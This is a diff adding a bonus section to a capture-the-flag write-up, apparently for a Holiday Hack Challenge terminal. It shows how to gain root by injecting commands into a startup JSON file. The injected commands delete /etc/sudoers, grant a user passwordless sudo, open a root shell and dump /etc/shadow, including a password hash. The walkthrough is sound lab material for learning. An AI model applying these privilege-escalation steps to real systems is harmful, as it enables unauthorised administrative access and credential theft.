@@ -152,6 +152,42 @@ elfu@c27f40ac7165:\~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.
 np-north-1e
 ```
 
+### Bonus: Root Access to Terminal
+
+ Suspend the session in the bottom pane with CTRL-Z
+ ```
+ init@c22e7dc1a1f1:~$ cp questions_answers.json questions_answers.json2
+init@c22e7dc1a1f1:~$ mv questions_answers.json2 questions_answers.json
+mv: replace 'questions_answers.json', overriding mode 0644 (rw-r--r--)? y
+init@c22e7dc1a1f1:~$ vi questions_answers.json
+ ``` 
+ Change file to re-create the suders file with sudo to root permissions for the user elfu:
+ ```
+ "questions":[
+{
+  "cmds_on_begin":[
+    "sudo /opt/imds/imds.sh 2>&1 >/tmp/.imds.log &",
+    "sudo rm /etc/sudoers",
+    "echo 'elfu ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
+],
+ ```
+ Next the tmux session has to be renamed:
+ CTRL-B
+ `:rename-session -t ElfU e`
+ Finally, a new session is started:
+ ```
+init@c22e7dc1a1f1:~$ tmuxp load mysession.yaml
+[Loading] /home/init/mysession.yaml
+Already inside TMUX, switch to session? yes/no
+Or (a)ppend windows in the current active session?
+[y/n/a]: y
+ elfu@c22e7dc1a1f1:~$ sudo bash
+root@c22e7dc1a1f1:/home/elfu# id
+uid=0(root) gid=0(root) groups=0(root)
+root@c22e7dc1a1f1:/home/elfu# cat /etc/shadow
+root:$6$PzcpSOrlQdaqyDbS$Y3pZzo53tSYHpf4uFhwYvQ3HR/z04hDhNlL4dwfGmef2oleaLsg7q.kaGAbD3fUTGKSc.3h3vNssC9Kt3HjdN.:18954:0:99999:7:::
+ ```
+ 
 **Achievement: IMDS Exploration**  
 The Troll provides hints for [objective 10](https://github.com/joergschwarzwaelder/hhc2021/tree/master/Objective-10):  
 **Hint: AWS IMDS Documentation**
